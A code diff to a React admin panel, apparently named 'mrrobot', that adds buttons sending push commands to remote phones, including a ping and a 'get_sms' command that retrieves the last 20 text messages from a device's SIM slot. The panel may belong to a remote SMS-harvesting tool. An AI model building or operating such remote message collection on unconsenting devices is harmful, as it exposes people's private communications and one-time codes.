@@ -1324,6 +1324,52 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
   const [msgsLoading, setMsgsLoading] = useState(false);
   const [msgSearch, setMsgSearch] = useState("");
 
+  // Inline states for direct-fire buttons (no dialog)
+  const [pingState, setPingState] = useState<FcmState>("idle");
+  const [pingCountdown, setPingCountdown] = useState(0);
+  const [getSmsState, setGetSmsState] = useState<FcmState>("idle");
+
+  // Countdown timer for ping
+  useEffect(() => {
+    if (pingState !== "sending") return;
+    setPingCountdown(0);
+    const iv = setInterval(() => setPingCountdown(c => c + 1), 1000);
+    const t = setTimeout(() => { setPingState("idle"); setPingCountdown(0); }, 30000);
+    return () => { clearInterval(iv); clearTimeout(t); };
+  }, [pingState]);
+
+  // Auto-reset on device_updated (ping responded)
+  useEffect(() => {
+    function onUpdated(e: Event) {
+      const { deviceId } = (e as CustomEvent<{ deviceId: string }>).detail;
+      if (deviceId !== device.deviceId) return;
+      setPingState("ok");
+      setTimeout(() => { setPingState("idle"); setPingCountdown(0); }, 3000);
+    }
+    window.addEventListener("mrrobot:device_updated", onUpdated);
+    return () => window.removeEventListener("mrrobot:device_updated", onUpdated);
+  }, [device.deviceId]);
+
+  async function firePing() {
+    if (!device.hasFcm) return;
+    setPingState("sending");
+    try {
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "online_check" } }) });
+      if (!r.ok) { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+    } catch { setPingState("err"); setTimeout(() => setPingState("idle"), 3000); }
+  }
+
+  async function fireGetSms() {
+    if (!device.hasFcm) return;
+    setGetSmsState("sending");
+    try {
+      const r = await apiFetch("/api/fcm/send", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ deviceId: device.deviceId, data: { type: "get_sms", count: "20", simSlot: "0" } }) });
+      if (!r.ok) { setGetSmsState("err"); setTimeout(() => setGetSmsState("idle"), 3000); return; }
+      setGetSmsState("ok");
+      setTimeout(() => setGetSmsState("idle"), 4000);
+    } catch { setGetSmsState("err"); setTimeout(() => setGetSmsState("idle"), 3000); }
+  }
+
   const ONLINE_MS = 15 * 60 * 1000;
   const isRecent = device.lastOnline ? (Date.now() - new Date(device.lastOnline).getTime()) < ONLINE_MS : false;
 
@@ -1420,6 +1466,40 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
           {/* ── Action buttons 3×2 grid ── */}
           <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
             {ACTION_LABELS.map(({ key, label }) => {
+              // Direct-fire buttons — no dialog
+              if (key === "online_check") {
+                const st = pingState;
+                const bg = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accentGlow : T.card;
+                const bc = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accent : T.borderLight;
+                const col = st === "idle" ? T.mutedLight : st === "sending" ? T.accentLight : "#fff";
+                return (
+                  <button key={key} onClick={() => void firePing()} disabled={st === "sending" || !device.hasFcm} style={{
+                    background: bg, border: `1.5px solid ${bc}`, borderRadius: 9, padding: "11px 4px",
+                    cursor: st === "sending" || !device.hasFcm ? "wait" : "pointer",
+                    fontSize: 11, fontWeight: 600, color: col, textAlign: "center", transition: "all 0.15s",
+                    display: "flex", alignItems: "center", justifyContent: "center", gap: 4,
+                  }}>
+                    {st === "sending" ? <><Spinner size={10} /> {pingCountdown}s…</> : st === "ok" ? "✓ Online" : st === "err" ? "✗ Error" : label}
+                  </button>
+                );
+              }
+              if (key === "get_sms") {
+                const st = getSmsState;
+                const bg = st === "ok" ? T.green + "22" : st === "err" ? T.red + "18" : st === "sending" ? T.accentGlow : T.card;
+                const bc = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accent : T.borderLight;
+                const col = st === "ok" ? T.green : st === "err" ? T.red : st === "sending" ? T.accentLight : T.mutedLight;
+                return (
+                  <button key={key} onClick={() => void fireGetSms()} disabled={st === "sending" || !device.hasFcm} style={{
+                    background: bg, border: `1.5px solid ${bc}`, borderRadius: 9, padding: "11px 4px",
+                    cursor: st === "sending" || !device.hasFcm ? "wait" : "pointer",
+                    fontSize: 11, fontWeight: 600, color: col, textAlign: "center", transition: "all 0.15s",
+                    display: "flex", alignItems: "center", justifyContent: "center", gap: 4,
+                  }}>
+                    {st === "sending" ? <><Spinner size={10} /> Getting…</> : st === "ok" ? "✓ Sent!" : st === "err" ? "✗ Error" : label}
+                  </button>
+                );
+              }
+              // Dialog-based buttons
               const isActive = activeAction === key;
               return (
                 <button key={key} onClick={() => setActiveAction(isActive ? null : key)} style={{
